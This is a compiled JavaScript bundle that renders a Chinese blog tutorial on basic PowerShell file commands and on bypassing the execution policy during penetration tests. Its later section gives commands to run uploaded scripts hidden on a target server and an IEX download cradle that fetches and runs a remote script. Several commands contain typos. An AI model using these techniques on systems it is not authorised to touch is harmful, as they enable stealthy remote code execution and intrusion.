(window.webpackJsonp=window.webpackJsonp||[]).push([[248],{534:function(e,t,s){"use strict";s.r(t);var a=s(6),r=Object(a.a)({},(function(){var e=this,t=e._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h1",{attrs:{id:"powershell基本命令和绕过权限执行"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#powershell基本命令和绕过权限执行"}},[e._v("#")]),e._v(" PowerShell基本命令和绕过权限执行")]),e._v(" "),t("h2",{attrs:{id:"基本命令"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#基本命令"}},[e._v("#")]),e._v(" 基本命令")]),e._v(" "),t("p",[e._v("以文件操作为例")]),e._v(" "),t("h2",{attrs:{id:"新建目录"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#新建目录"}},[e._v("#")]),e._v(" 新建目录")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("New-Item whitecellclub-ItemType Directory\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"新建文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#新建文件"}},[e._v("#")]),e._v(" 新建文件")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("New-Item light.txt-ItemType File\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"删除目录"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#删除目录"}},[e._v("#")]),e._v(" 删除目录")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("Remove-Item whitecellclub\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"显示文件内容"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#显示文件内容"}},[e._v("#")]),e._v(" 显示文件内容")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("Get-Content test.txt\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"设置文本内容"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#设置文本内容"}},[e._v("#")]),e._v(" 设置文本内容")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v('Set-Content test.txt-Value"Hello World!"\n')])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"追加内容"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#追加内容"}},[e._v("#")]),e._v(" 追加内容")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v('Add-Content light.txt-Value"i love you"\n')])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"清除内容"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#清除内容"}},[e._v("#")]),e._v(" 清除内容")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("Clear-Content test.txt\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"执行策略"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#执行策略"}},[e._v("#")]),e._v(" 执行策略")]),e._v(" "),t("p",[e._v("获取执行策略")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("Get-ExecutionPolicy\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("策略分以下几种：")]),e._v(" "),t("ul",[t("li",[e._v("Restricted: 脚本不能执行(默认)")]),e._v(" "),t("li",[e._v("RemoteSigned: 本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)。")]),e._v(" "),t("li",[e._v("AllSigned: 仅当脚本由受信任的发布者签名时才能运行。")]),e._v(" "),t("li",[e._v("Unrestricted: 允许所有的script运行")])]),e._v(" "),t("p",[e._v("可以使用如下命令格式设置PowerShell的执行策略")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("Set-ExecutionPolicy <Policy name>\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"绕过策略来执行脚本"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#绕过策略来执行脚本"}},[e._v("#")]),e._v(" 绕过策略来执行脚本")]),e._v(" "),t("p",[e._v("如果要运行PowerShell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted,所以，在渗透时，需要采用一些方法绕过策略来执行脚本")]),e._v(" "),t("h2",{attrs:{id:"绕过本地权限执行"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#绕过本地权限执行"}},[e._v("#")]),e._v(" 绕过本地权限执行")]),e._v(" "),t("p",[e._v("上传xxx.ps1到目标服务器，在CMD环境下，在目标服务器本地执行该脚本")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("PowerShell.exe-ExecutionPolicy Bypass-File xxx.ps1\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"本地隐藏绕过权限执行脚本"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#本地隐藏绕过权限执行脚本"}},[e._v("#")]),e._v(" 本地隐藏绕过权限执行脚本")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("PowerShell.exe-ExecutionPolicy Bypass-WindowStyle Hidden-NoLogo-NonInteractive-NoProfile-File xxx.ps1\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"用iex下载远程ps1脚本绕过权限执行"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#用iex下载远程ps1脚本绕过权限执行"}},[e._v("#")]),e._v(" 用IEX下载远程PS1脚本绕过权限执行")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v('PowerShell.exe-ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-Nonl IEX (New-ObjectNet.WebClient).DownloadString("xxx.ps1");[Parameters]\n')])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("以上命令的参数说明：")]),e._v(" "),t("ul",[t("li",[e._v("ExecutionPolicy Bypass : 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全规则。在渗透测试中，基本每一次运行PowerShell脚本时都要使用这个参数。")]),e._v(" "),t("li",[e._v("WindowStyle Hidden ： 隐藏窗口")]),e._v(" "),t("li",[e._v("NoLogo : 启动不显示版权标志的PowerShell")]),e._v(" "),t("li",[e._v("NonInteractive (-Nonl) : 非交互模式，PowerShell不为用户提供交互的提示")]),e._v(" "),t("li",[e._v("NoProfile (-Nop): PowerShell控制台不加载当前用户的配置文件")]),e._v(" "),t("li",[e._v("Noexit : 执行后不退出Shell。这在使用键盘记录等脚本时非常重要。")]),e._v(" "),t("li",[e._v("PowerShell脚本在默认情况下无法直接运行，这时就可以使用上述三种方法绕过安全策略，运行PowerShell脚本。")])]),e._v(" "),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[e._v("#")]),e._v(" 写在最后")]),e._v(" "),t("blockquote",[t("p",[e._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[e._v("冰河技术")]),e._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[e._v("冰河技术")]),e._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[e._v("冰河技术")]),e._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[e._v("冰河技术")]),e._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),e._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=r.exports}}]);